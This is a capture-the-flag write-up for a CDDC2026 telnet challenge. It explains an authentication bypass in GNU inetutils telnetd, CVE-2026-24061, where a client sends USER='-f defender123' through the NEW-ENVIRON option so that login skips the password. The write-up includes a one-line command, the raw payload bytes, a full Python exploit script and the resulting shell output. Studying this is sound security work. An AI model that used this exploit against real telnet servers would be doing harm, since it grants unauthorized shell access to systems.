---
title: 'CDDC2026 — Telnet "defender123" (network/misc)'
pubDate: "2026-08-15"
updatedDate: "2026-08-15"
event: "CDDC2026"
author: ""
score: ""
description: |
  > You have identified a critical server running a Telnet service.
  > The username is known to be `defender123`, but the password is unknown.
  > Gain access to the server and retrieve the flag.
  >
  > `nc cddc2026.xyz 2323`
  > Flag Format: `CDDC2026{}`
tags: ["network", "misc"]
---

# CDDC2026 — Telnet "defender123" — Writeup

**Category:** Network / Misc
**Target:** `nc cddc2026.xyz 2323`
**Flag:** `CDDC2026{t3ln3t_n3w_3nv1r0n_byp4ss_2026}`

---

## Challenge description

> You have identified a critical server running a Telnet service.
> The username is known to be `defender123`, but the password is unknown.
> Gain access to the server and retrieve the flag.
>
> `nc cddc2026.xyz 2323`

---

## Hints from the description (and what they actually meant)

The description is deliberately worded to push you toward password cracking — and that is the trap.

| What the description says                      | What it's really pointing at                                                                                                                       |
| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| "username is known... password is unknown"     | The intended path is **not** to recover the password. The username is the only credential you need to _target_ — you bypass the password entirely. |
| "critical server running a **Telnet** service" | Telnet itself is the vulnerability. The protocol's option negotiation is the attack surface, not the login form.                                   |
| "Gain access" (not "crack the password")       | Access ≠ password. An auth **bypass** satisfies the goal.                                                                                          |

The decisive hint comes from the **connection itself**: immediately on connect, the server sends a telnet option-negotiation request `IAC DO NEW-ENVIRON`. That is the server _inviting the client to supply environment variables_ — and that is the bug.

---

## Recon

### Initial connect

```
$ nc cddc2026.xyz 2323
(raw bytes) ff fd 18 ff fd 20 ff fd 23 ff fd 27 ff fd 24 ...
```

Decoding the telnet IAC commands the server sends:

| Bytes      | Meaning                                       |
| ---------- | --------------------------------------------- |
| `ff fd 18` | DO TERMINAL-TYPE (24)                         |
| `ff fd 20` | DO TERMINAL-SPEED (32)                        |
| `ff fd 23` | DO X-DISPLAY-LOCATION (35)                    |
| `ff fd 27` | **DO NEW-ENVIRON (39)** ← the interesting one |
| `ff fd 24` | DO OLD-ENVIRON (36)                           |

After negotiating, the banner appears:

```
Linux 6.17.0-1017-aws (223cdbd0c32f) (pts/N)

223cdbd0c32f login:
```

It is a stock GNU inetutils `telnetd` fronting `/usr/bin/login`.

### Why brute force is a dead end (and was abandoned)

I confirmed empirically:

- **One concurrent connection only** — opening N parallel sockets, exactly **1** succeeds and the rest get instant `EOF`. (Aggressive parallelism also briefly rate-limits/bans the source IP.)
- **~3 s `FAIL_DELAY`** per wrong password, attempts are serialized, ~3 logins per connection before disconnect.

That caps throughput at roughly one guess every ~3 s, single-threaded — infeasible for any real wordlist. The fact that `defender123` happens to be an entry in John's `password.lst` (line 113437 of the 1.79M-entry Openwall list) is a **coincidence / red herring**: adjacency, rank, mirror-rank, kernel-number offsets, `defender*` siblings, and the top of the list were all tested and all returned a clean `Login incorrect`.

The login surface was also probed for info leaks — empty/other usernames, format strings (`%s%s%s%n`), overlong input, empty password — all returned the same hardened `Login incorrect`. No oracle, no enumeration.

Conclusion: the password is not meant to be found. The `DO NEW-ENVIRON` negotiation is the way in.

---

## The vulnerability — CVE-2026-24061

GNU inetutils `telnetd` passes the client-supplied **`USER`** environment variable to `/usr/bin/login` **without sanitization**.

`login` accepts a `-f <user>` flag meaning _"this user is already authenticated — skip password verification"_ (intended for trusted front-ends doing their own auth).

If the client sets:

```
USER=-f defender123
```

then `telnetd` ends up invoking:

```
login -f defender123
```

→ `login` treats `defender123` as pre-authenticated and drops straight to a shell, **no password required**.

This is the same class of bug as the historical netkit/inetutils telnetd env-injection issues, re-assigned as **CVE-2026-24061**.

The `USER` value is delivered over the wire using the telnet **NEW-ENVIRON** option (RFC 1572) — which is exactly the option the server advertised with `DO NEW-ENVIRON`.

---

## Exploitation

### The "official" one-liner

With a real telnet client, `-a` (attempt automatic login) sends the local `USER` env var:

```bash
USER="-f defender123" telnet -a cddc2026.xyz 2323
```

### Doing it by hand (no telnet client available)

I had no telnet binary on the host, so I implemented the NEW-ENVIRON subnegotiation directly:

1. Server: `IAC DO NEW-ENVIRON` → Client: `IAC WILL NEW-ENVIRON`
2. Server: `IAC SB NEW-ENVIRON SEND IAC SE` (asks for variables)
3. Client replies with the injected `USER`:

```
IAC SB NEW-ENVIRON IS  VAR "USER"  VALUE "-f defender123"  IAC SE
```

Byte-level (NEW-ENVIRON sub-codes: IS=0, SEND=1, VAR=0, VALUE=1):

```
ff fa 27 00 00 55 53 45 52 01 2d 66 20 64 65 66 65 6e 64 65 72 31 32 33 ff f0
└IAC SB NEW-ENVIRON
        IS=00
           VAR=00
              "USER"            VALUE=01 "-f defender123"            IAC SE
```

All other `DO` options are answered `WONT`; server `WILL ECHO/SGA` → `DO`. After this exchange `telnetd` execs `login -f defender123` and we land on a shell prompt instead of `login:`.

### Result

```
Linux 6.17.0-1017-aws (223cdbd0c32f) (pts/10)
$ id
uid=1000(defender123) gid=1000(defender123) groups=1000(defender123)
$ ls -la
-r--r----- 1 root defender123 41 May 12 04:51 flag.txt
$ cat flag.txt
CDDC2026{t3ln3t_n3w_3nv1r0n_byp4ss_2026}
```

The flag (`t3ln3t_n3w_3nv1r0n_byp4ss`) confirms the intended path.

---

## Solve script

`exploit.py` (manual NEW-ENVIRON injection) — core logic:

```python
import socket, time
HOST, PORT = "cddc2026.xyz", 2323
IAC,SE,SB,WILL,WONT,DO,DONT = 255,240,250,251,252,253,254
ECHO,SGA,NEWENV = 1,3,39
IS,SEND,VAR,VALUE = 0,1,0,1

def run(uservalue):
    s = socket.socket(); s.connect((HOST,PORT)); s.settimeout(5)
    buf = b""; t0 = time.time()
    while time.time()-t0 < 12:
        try: data = s.recv(4096)
        except socket.timeout: break
        if not data: break
        i = 0; reply = bytearray(); text = bytearray()
        while i < len(data):
            if data[i]==IAC and i+1<len(data):
                cmd = data[i+1]
                if cmd in (DO,DONT,WILL,WONT) and i+2<len(data):
                    opt = data[i+2]; i += 3
                    if cmd==DO:
                        reply += bytes([IAC,WILL,NEWENV]) if opt==NEWENV else bytes([IAC,WONT,opt])
                    elif cmd==WILL:
                        reply += bytes([IAC,DO,opt]) if opt in (ECHO,SGA) else bytes([IAC,DONT,opt])
                    continue
                if cmd==SB:
                    j = i+2
                    while j+1<len(data) and not (data[j]==IAC and data[j+1]==SE): j += 1
                    if data[i+2]==NEWENV:   # server sent SEND -> reply IS USER=...
                        reply += bytes([IAC,SB,NEWENV,IS,VAR])+b"USER"+bytes([VALUE]) \
                                 + uservalue.encode()+bytes([IAC,SE])
                    i = j+2; continue
                i += 2; continue
            text.append(data[i]); i += 1
        if reply: s.sendall(bytes(reply))
        buf += bytes(text)
        if b"$" in buf or b"#" in buf:      # shell, not "login:"
            s.sendall(b"cat ~/flag.txt\n"); time.sleep(2)
            print(s.recv(4096).decode("latin-1","replace")); break
    s.close()

run("-f defender123")
```

---

## Lessons / takeaways

- **Read the telnet negotiation, not just the banner.** `DO NEW-ENVIRON` was the entire hint — the server told us it would accept client environment variables.
- "Find the password" framing is misdirection; **auth bypass** beats auth cracking.
- Never pass externally-controlled environment variables (`USER`) into a privileged program's argument vector. `login -f` + attacker-controlled `USER` = pre-authenticated shell.
- A username appearing in a famous wordlist is not automatically a brute-force clue — verify the _mechanism_ before committing to grinding.

## References

- CVE-2026-24061 PoC — https://github.com/0xXyc/telnet-inetutils-auth-bypass-CVE-2026-24061
- AtHack 2026 "telneted" challenge (same bug) — https://github.com/athack-ctf/chall2026-telneted
- RFC 1572 — Telnet Environment Option
